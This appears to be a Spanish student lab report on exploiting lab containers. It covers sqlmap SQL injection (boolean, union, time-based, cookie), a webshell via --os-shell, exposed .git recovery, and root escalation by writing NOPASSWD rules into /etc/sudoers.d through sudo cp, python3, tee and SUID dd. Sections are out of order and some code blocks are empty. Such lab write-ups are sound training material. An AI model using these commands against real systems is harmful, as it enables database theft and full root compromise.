## 4. Uso de sqlmap

### 4.1 Enumeración inicial

El comando utilizado fue:

```bash
sqlmap -u http://172.31.0.40 --data=username=test&password=test --batch --tables
```

Este comando automatiza el ataque de SQL Injection sobre el formulario, enviando los campos `username` y `password` en el cuerpo de la petición. La opción `--tables` se usa para enumerar las tablas de la base de datos.

### 4.2 Ubicación de los resultados de sqlmap

Los resultados de sqlmap quedan almacenados en el directorio local del usuario que ejecuta la herramienta. En el caso de `root`, la ruta es:

```bash

```

### 5.2 Volcado de todos los datos

## 7. Análisis de payloads de SQLMap

También se analizaron algunas de las inyecciones SQL concretas que utiliza sqlmap.

### 7.1 Boolean-based blind (`--technique=B`)

Comando utilizado:

```bash
sqlmap -u "http://172.31.0.40/product.php?id=1" --batch --technique=B --dbms=SQLite
```

Payload observado:

```text
http://172.31.0.40/product.php?id=1 AND SUBSTR(sqlite_version(),1,1)='1'
```

#### Funcionamiento

Este payload utiliza una técnica **boolean-based blind**. La condición añadida comprueba si el primer carácter de la versión de SQLite es `'1'`.

- `sqlite_version()` obtiene la versión del motor SQLite.
    
- `SUBSTR(sqlite_version(),1,1)` extrae el primer carácter.
    
- Si la condición es verdadera, la respuesta de la aplicación será distinta que si es falsa.
    

Aunque la aplicación no muestre directamente el resultado de la consulta, sqlmap puede inferir información comparando el comportamiento de la respuesta.

### 7.2 Union-based (`--technique=U`)

Comando utilizado:

```bash
sqlmap -u "http://172.31.0.40/product.php?id=1" --batch --technique=U --dbms=SQLite
```

Payload observado:

```text
http://172.31.0.40/product.php?id=1%20UNION%20ALL%20SELECT%20NULL,NULL,(SELECT%20sqlite_version()),NULL%20--%20lfDr
```

#### Funcionamiento

Este payload utiliza una técnica **UNION-based SQL Injection**.

La idea es añadir una segunda consulta con `UNION ALL SELECT` para que el resultado de esa nueva consulta se mezcle con el resultado legítimo de la aplicación.

- Los valores `NULL` se usan para rellenar las columnas que no interesan.
    
- En una de las columnas se inserta el resultado de `sqlite_version()`.
    
- El comentario final `--` evita que el resto de la consulta original interfiera.
    

Si la consulta es válida y una de esas columnas se refleja en la página, la información se muestra directamente en la respuesta.

### 7.3 Time-based blind (`--technique=T`)

Comando utilizado:

```bash
sqlmap -u "http://172.31.0.40/product.php?id=1" --batch --technique=T --dbms=SQLite --risk=3 --level=5
```

Payload observado:

```text
AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)
```

#### Funcionamiento

Este payload utiliza una técnica **time-based blind SQL Injection**.

En SQLite no existe una función `SLEEP()` nativa, por lo que sqlmap provoca un retraso artificial ejecutando una operación costosa si se cumple una condición.

- `([INFERENCE])` representa la condición que se está comprobando.
    
- Si la condición es verdadera, se ejecuta una operación pesada con `RANDOMBLOB`, `HEX` y `UPPER`.
    
- Si es falsa, la consulta responde rápidamente.
    

Midiendo el tiempo de respuesta, sqlmap puede deducir si la condición era verdadera o falsa y reconstruir información sin necesidad de verla en pantalla.

## 8. Inyección SQL en cookies

También se trabajó con **inyección SQL a través de cookies**.

Payload manual introducido en la cookie:

```text
alice' OR '1'='1' ORDER By id asc limit 1 offset 0 --
```

Este valor se introdujo dentro del contenido de la cookie para alterar la consulta SQL que utilizaba la aplicación.

Después, se utilizó sqlmap sobre la cookie:

```bash
sqlmap -u "http://172.31.0.40/cookie_lab.php" --cookie="user=alice" --batch --level=2
```

### Funcionamiento

En este caso, el parámetro vulnerable no se encontraba ni en la URL ni en el cuerpo del formulario, sino dentro de una **cookie HTTP**.

La opción `--cookie="user=alice"` indica a sqlmap qué cookie debe enviar, y con `--level=2` se le permite probar también parámetros menos evidentes, como las cookies.

## 9. Obtención de una webshell

Finalmente, se realizó la obtención de una **webshell** mediante sqlmap con el siguiente comando:

```bash
sqlmap -u "http://172.31.0.50/rce_sqli.php?id=1" -p id --dbms=mysql --os-shell --web-root="/var/www/html" --batch
```

### Funcionamiento

En este caso, la vulnerabilidad SQL Injection se aprovechó no solo para extraer información, sino para intentar obtener ejecución de comandos en el sistema.

- `-p id` indica que el parámetro vulnerable es `id`.
    
- `--dbms=mysql` fuerza el uso del motor MySQL.
    
- `--os-shell` ordena a sqlmap intentar conseguir una shell del sistema operativo.
    
- `--web-root="/var/www/html"` especifica la ruta raíz del servidor web, para que sqlmap pueda colocar los ficheros necesarios si la técnica utilizada requiere subir o escribir un archivo en el servidor.
    

De esta forma, sqlmap intenta explotar capacidades del motor de base de datos y del servidor para obtener acceso interactivo al sistema comprometido.

## 10. Conclusión

Durante la práctica se realizó un proceso completo de reconocimiento y explotación sobre una aplicación web vulnerable:

1. Identificación del entorno y de la red.
    
2. Descubrimiento de un servicio web activo.
    
3. Detección de una vulnerabilidad de SQL Injection.
    
4. Explotación automatizada con sqlmap.
    
5. Enumeración de tablas y volcado de información.
    
6. Análisis de distintas técnicas de inyección utilizadas por la herramienta.
    
7. Explotación a través de cookies.
    
8. Obtención de una webshell en un escenario de RCE mediante SQL Injection.
    

La práctica permitió comprobar cómo una vulnerabilidad de inyección SQL puede escalar desde una simple alteración de consultas hasta la extracción completa de datos e incluso la ejecución remota de comandos.

## 2. Objetivo de la práctica

El objetivo inicial consiste en **enumerar las tablas existentes dentro de una base de datos** asociada al servidor generado al levantar los contenedores Docker.

Para ello, se parte de una vulnerabilidad en la funcionalidad de importación o subida de ficheros de la aplicación web.

Esto indica que la aplicación realiza una validación débil basada en el nombre o extensión del fichero, pero no comprueba correctamente el contenido real del archivo, su tipo MIME o sus magic bytes.

## 8. Enumeración HTTP con Feroxbuster

Como tercera herramienta de enumeración web se utiliza `feroxbuster`.

Comando base:

```bash
feroxbuster -u http://172.31.0.22/ -x txt,html,old,bak,zip,git
```

Feroxbuster permite enumerar rutas y archivos, pero destaca especialmente por poder hacer enumeración recursiva. Es decir, si encuentra directorios como `/admin/` o `/backups/`, puede seguir buscando automáticamente dentro de ellos.

Opciones útiles de configuración:

```bash

```

Permite indicar manualmente el diccionario. Por ejemplo:

```bash
feroxbuster -u http://172.31.0.22/ -w /usr/share/wordlists/dirb/common.txt -x txt,html,old,bak,zip,git
```

```bash
-t 20
```

Configura el número de hilos. Más hilos hacen el escaneo más rápido, aunque también más ruidoso.

```bash
-d 2
```

Limita la profundidad de recursividad.

```bash
-C 403
```

Filtra respuestas con código `403 Forbidden`, útil si aparecen demasiados resultados no accesibles.

```bash
--filter-size 276
```

Filtra respuestas por tamaño. En esta práctica puede ser útil porque muchas respuestas `403` tenían tamaño `276`.

```bash
-o ferox_results.txt
```

Guarda la salida en un fichero.

Feroxbuster se usa para contrastar los resultados obtenidos con DIRB y Gobuster, y para profundizar automáticamente en los directorios descubiertos.

## 9. Descarga del directorio `.git` expuesto

Tras confirmar que existe un recurso accesible en:

```text

```

se intenta descargar el contenido del directorio `.git` para reconstruir información del repositorio.

Comando usado:

```bash
wget -q -r -np -nH --cut-dirs=1 -R "index.html*" http://172.31.0.22/.git/ -P .git/
```

Explicación de las opciones:

```text
-q
```

Modo silencioso. Reduce la salida por pantalla.

```text
-r
```

Descarga recursiva. Intenta bajar también subdirectorios internos de `.git`.

```text
-np
```

No asciende a directorios padre. Evita que `wget` salga de `/.git/`.

```text
-nH
```

No crea una carpeta con el nombre del host.

```text
--cut-dirs=1
```

Elimina el primer directorio de la ruta remota. En este caso ayuda a guardar la estructura interna del repositorio dentro de la carpeta local indicada.

```text
-R "index.html*"
```

Rechaza ficheros `index.html` generados por el listado de directorios de Apache.

```text
-P .git/
```

Guarda la descarga dentro de una carpeta local llamada `.git/`.

El objetivo de este paso es aprovechar la exposición parcial del directorio `.git` en el servidor web. Si se consigue descargar suficiente contenido, se puede intentar reconstruir el estado del proyecto, revisar código fuente, buscar rutas internas, configuraciones o credenciales.

Una vez descargado el contenido de `.git`, se crea una carpeta donde recuperar los archivos del proyecto:

```bash

```

Después se usa Git indicando manualmente dónde está el repositorio y dónde debe reconstruir el árbol de trabajo:

```bash
git --git-dir=.git --work-tree=recovered_repo checkout -f
```

Explicación:

```text
--git-dir=.git
```

Indica que la carpeta `.git` descargada se debe usar como repositorio Git.

```text
--work-tree=recovered_repo
```

Indica que los archivos recuperados deben escribirse dentro de `recovered_repo`.

```text
checkout -f
```

Fuerza la recuperación de los ficheros versionados disponibles en el repositorio.

Con esto se intenta reconstruir el código fuente o los ficheros del proyecto a partir del `.git` expuesto.

Al estar expuesto el directorio `.git`, puede que algunos archivos no estén visibles directamente en la web, pero sigan existiendo dentro del estado versionado del repositorio. Con `git restore` se pueden recuperar esos ficheros.

```text
https://gtfobins.org/
```

GTFOBins recopila binarios Unix que pueden aprovecharse en determinadas condiciones, por ejemplo:

- `sudo` mal configurado;
- binarios con SUID;
- capacidades Linux;
- lectura o escritura de ficheros;
- ejecución de comandos;
- obtención de shells.

## 16. Escalada de privilegios con `user1`

Se vuelve a comprobar `sudo -l` con `user1` y se observa que puede ejecutar `/bin/cp` como root sin contraseña:

```text
Matching Defaults entries for user1 on vuln_gtfo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User user1 may run the following commands on vuln_gtfo:
    (root) NOPASSWD: /bin/cp
```

Además, en `/etc` existe la carpeta:

```text
/etc/sudoers.d
```

Este directorio se utiliza para configuraciones adicionales de sudoers.

La estrategia consiste en crear un fichero de configuración propio que conceda permisos completos a `user1`:

```text
user1 ALL=(ALL) NOPASSWD: ALL
```

Ejemplo de comandos para realizarlo:

```bash
echo "user1 ALL=(ALL) NOPASSWD: ALL" > /tmp/user1
sudo /bin/cp /tmp/user1 /etc/sudoers.d/user1
```

Después se comprueba:

```bash
sudo -l
sudo -i
```

Con esto se consigue escalar privilegios con `user1`, aprovechando una mala configuración de `sudo` que permitía ejecutar `/bin/cp` como root sin contraseña.

## 17. Escalada de privilegios con `user2`

Se pasa al usuario `user2`.

Este usuario puede ejecutar `python3` sin contraseña. Se reutiliza la estrategia anterior: modificar la configuración de `sudoers.d`, pero esta vez mediante Python.

Comando usado:

```bash
sudo python3 -c 'open("/etc/sudoers.d/user2","w+").write("user2 ALL=(ALL) NOPASSWD: ALL\n")'
```

El comando crea o sobrescribe el fichero:

```text
/etc/sudoers.d/user2
```

con la regla:

```text
user2 ALL=(ALL) NOPASSWD: ALL
```

Después se puede comprobar:

```bash
sudo -l
sudo -i
```

Con esto se consigue escalar privilegios de nuevo, ahora con `user2`, aprovechando una mala configuración de `sudo` que permite ejecutar `python3` con privilegios elevados.

## 18. Escalada de privilegios con `user3`

Se pasa al usuario `user3`.

Este usuario tiene permisos para ejecutar `tee` sin contraseña.

Se utiliza la misma estrategia de escribir una regla en `/etc/sudoers.d`, pero aplicando `sudo` al comando que realmente escribe en el fichero: `tee`.

Comando correcto:

```bash
echo "user3 ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/user3
```

La regla escrita es:

```text
user3 ALL=(ALL) NOPASSWD: ALL
```

Después se comprueba:

```bash
sudo -l
sudo -i
```

Con esto, `user3` obtiene permisos para ejecutar cualquier comando como root sin contraseña.

## 19. Escalada de privilegios con `user4`

Se pasa al usuario `user4`.

Este usuario no tiene privilegios útiles con `sudo`, por lo que se descarta la vía de `sudo -l` y se busca una escalada mediante binarios SUID.

Se enumeran los binarios con SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Salida obtenida:

```text
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/dd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/bzip2
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
```

Con esta lista se consulta GTFOBins:

```text
https://gtfobins.org/
```

Se identifica que `dd` puede ser útil porque permite leer y escribir ficheros.

La idea general de uso de `dd` para escribir sería:

```bash
echo DATA | dd of=/path/to/output-file
```

Sin embargo, al comprobar `sudo -l`, aparece el siguiente problema:

```text
sudo: /etc/sudoers.d/user4 is owned by gid 1003, should be 0
[sudo] password for user4:
Sorry, user user4 may not run sudo on vuln_gtfo.
```

Esto indica que el fichero `/etc/sudoers.d/user4` tiene un grupo incorrecto y `sudo` lo rechaza.

Para evitar este problema, se aprovecha un fichero ya existente y válido dentro de `/etc/sudoers.d`, que tenga propietario y grupo correctos, normalmente `root:root`. La estrategia consiste en:

1. Copiar el contenido de un fichero sudoers válido a una ubicación temporal.
2. Añadir la regla de `user4`.
3. Usar `dd` con SUID para sobrescribir el fichero válido existente.
4. Al sobrescribir un fichero ya existente, se conservan propietario, grupo y permisos del fichero original.

Primero se revisan los ficheros existentes:

```bash
ls -l /etc/sudoers.d/
```

Se elige un fichero válido existente, por ejemplo uno que ya tenga propietario y grupo correctos:

```bash
ls -l /etc/sudoers.d/user1
```

Se copia su contenido a un fichero temporal editable:

```bash
cat /etc/sudoers.d/user1 > /tmp/sudoers_user4
```

Se añade la regla para `user4`:

```bash
echo "user4 ALL=(ALL) NOPASSWD: ALL" >> /tmp/sudoers_user4
```

Se comprueba el contenido antes de sobrescribir:

```bash
cat /tmp/sudoers_user4
```

Después se usa `dd` para sobrescribir el fichero sudoers válido existente:

```bash
/usr/bin/dd if=/tmp/sudoers_user4 of=/etc/sudoers.d/user1
```

La clave es que `/etc/sudoers.d/user1` ya existía con propietario y grupo correctos, por lo que al sobrescribir su contenido con `dd` se mantiene la metadata válida del fichero.

Finalmente se comprueba si `sudo` ya reconoce los permisos de `user4`:

```bash
sudo -l
```

Y se escala a root:

```bash
sudo -i
```

O, alternativamente:

```bash
sudo su
```

Con esto se consigue escalar privilegios también con `user4`.
